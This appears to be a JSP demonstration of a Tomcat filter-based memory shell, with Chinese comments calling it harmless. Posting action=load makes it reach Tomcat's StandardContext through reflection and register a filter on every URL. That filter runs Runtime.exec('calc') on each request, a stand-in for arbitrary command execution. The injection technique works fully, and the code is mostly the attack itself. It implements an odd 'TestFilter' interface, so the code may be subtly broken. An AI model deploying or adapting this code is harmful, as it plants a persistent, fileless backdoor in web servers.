<%@ page import="javax.servlet.*, javax.servlet.http.*, java.lang.reflect.*, java.util.*, org.apache.catalina.core.*" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.io.IOException" %>

<%
    request.setCharacterEncoding("UTF-8");
    response.setCharacterEncoding("UTF-8");
    response.setContentType("text/html; charset=UTF-8");
%>
<%
    // 无害化演示Filter（仅添加响应标识）
    class MemFilter implements TestFilter {
        public void init(FilterConfig config) {}

        public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
                throws ServletException {
            HttpServletResponse response = (HttpServletResponse) res;
            // 无害化标识：添加响应头
            response.addHeader("X-TestFilter-Active", "MemShell-Demo");
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            try {
                chain.doFilter(req, res);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        public void destroy() {}
    }

// 注入逻辑（通过参数触发）
    if ("load".equals(request.getParameter("action"))) {
        try {
            // 获取ApplicationContext
            ServletContext ctx = request.getServletContext();
            Field appCtxField = ctx.getClass().getDeclaredField("context");
            appCtxField.setAccessible(true);
            ApplicationContext appCtx = (ApplicationContext) appCtxField.get(ctx);

            // 获取StandardContext
            Field stdCtxField = appCtx.getClass().getDeclaredField("context");
            stdCtxField.setAccessible(true);
            StandardContext stdCtx = (StandardContext) stdCtxField.get(appCtx);

            // 防止重复注入
            boolean exists = stdCtx.findFilterDef("memFilter") != null;
            if (!exists) {
                // 创建Filter定义
                FilterDef filterDef = new FilterDef();
                filterDef.setFilterName("memFilter");
                filterDef.setFilterClass(MemFilter.class.getName());
                filterDef.setFilter(new MemFilter());

                // 添加Filter映射
                stdCtx.addFilterDef(filterDef);
                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName("memFilter");
                filterMap.addURLPattern("/*");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                stdCtx.addFilterMapBefore(filterMap);

                out.println("[+] TestFilter injected successfully!");

                //验证代码
                FilterDef filterDefCheck = stdCtx.findFilterDef("memFilter");
                if (filterDefCheck != null) {
                    out.println("[+] FilterDef存在");
                    FilterMap[] maps = stdCtx.findFilterMaps();
                    for (FilterMap map : maps) {
                        if ("memFilter".equals(map.getFilterName())) {
                            out.println("[+] FilterMap存在，匹配路径：" + Arrays.toString(map.getURLPatterns()));
                        }
                    }
                } else {
                    out.println("[-] FilterDef未找到");
                }
            } else {
                out.println("[-] TestFilter already exists");

                //验证代码
                FilterDef filterDefCheck = stdCtx.findFilterDef("memFilter");
                if (filterDefCheck != null) {
                    out.println("[+] FilterDef存在");
                    FilterMap[] maps = stdCtx.findFilterMaps();
                    for (FilterMap map : maps) {
                        if ("memFilter".equals(map.getFilterName())) {
                            out.println("[+] FilterMap存在，匹配路径：" + Arrays.toString(map.getURLPatterns()));
                        }
                    }
                } else {
                    out.println("[-] FilterDef未找到");
                }
            }
        } catch (Exception e) {
            out.println("[-] Injection error: " + e.toString());
        }
    }
%>



<!-- 注入触发器 -->
<form method="post">
    <input type="hidden" name="action" value="load">
    <input type="submit" value="Inject TestFilter">
</form>